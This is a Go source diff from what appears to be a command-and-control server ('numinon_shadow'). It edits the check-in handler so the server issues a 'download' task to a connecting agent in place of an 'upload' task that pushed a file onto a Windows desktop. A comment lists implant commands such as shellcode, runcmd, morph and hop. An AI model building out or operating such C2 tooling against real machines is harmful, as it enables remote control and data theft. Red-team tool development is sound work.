@@ -1,8 +1,6 @@
 package router
 
 import (
-	"crypto/sha256"
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -10,7 +8,6 @@ import (
 	"math/rand"
 	"net/http"
 	"numinon_shadow/internal/models"
-	"os"
 	"time"
 )
 
@@ -22,43 +19,18 @@ func CheckinHandler(w http.ResponseWriter, r *http.Request) {
 
 	var response models.ServerTaskResponse
 
-	// Randomly decide if a task is available (50/50 chance).
-
 	// A task is available, so populate the details.
 	response.TaskAvailable = true
 	response.TaskID = generateTaskID()
 
 	// Randomly select a command (this is just a temp way to test before integrating client that will issue commands intentionally)
-	commands := []string{"upload"}
+	commands := []string{"download"}
 	response.Command = commands[0]
 
 	//commands := []string{"runcmd", "upload", "download", "enumerate", "shellcode", "morph", "hop", "doesnotexist"}
 	//response.Command = commands[seededRand.Intn(len(commands))]
 
-	// HERE WE CREATE response.Data, UPLOAD SPECIFIC ARGUMENTS
-	fileBytes, err := os.ReadFile("./dummy/dummy.txt")
-	if err != nil {
-		panic(fmt.Errorf("failed to read prerequisite file: %w", err))
-	}
-	hashBytes := sha256.Sum256(fileBytes)
-
-	uploadArguments := models.UploadArgs{
-		TargetDirectory:   "C:\\Users\\vuilhond\\Desktop\\",
-		TargetFilename:    "dummy.txt",
-		FileContentBase64: base64.StdEncoding.EncodeToString(fileBytes),
-		ExpectedSha256:    fmt.Sprintf("%x", hashBytes),
-		OverwriteIfExists: true,
-	}
-
-	uploadArgsJSON, err := json.Marshal(uploadArguments)
-	if err != nil {
-		log.Printf("Failed to marshal upload args: %v", err)
-		http.Error(w, "Internal server error", http.StatusInternalServerError)
-		return
-	}
-	response.Data = uploadArgsJSON
-
-	// HERE UPLOAD SPECIFIC ARGUMENTS END
+	response.Data = returnDownloadStruct(w)
 
 	log.Printf("|📌 TASK ISSUED| -> Sent command '%s' with TaskID '%s' to Agent %s\n", response.Command, response.TaskID, agentID)
 
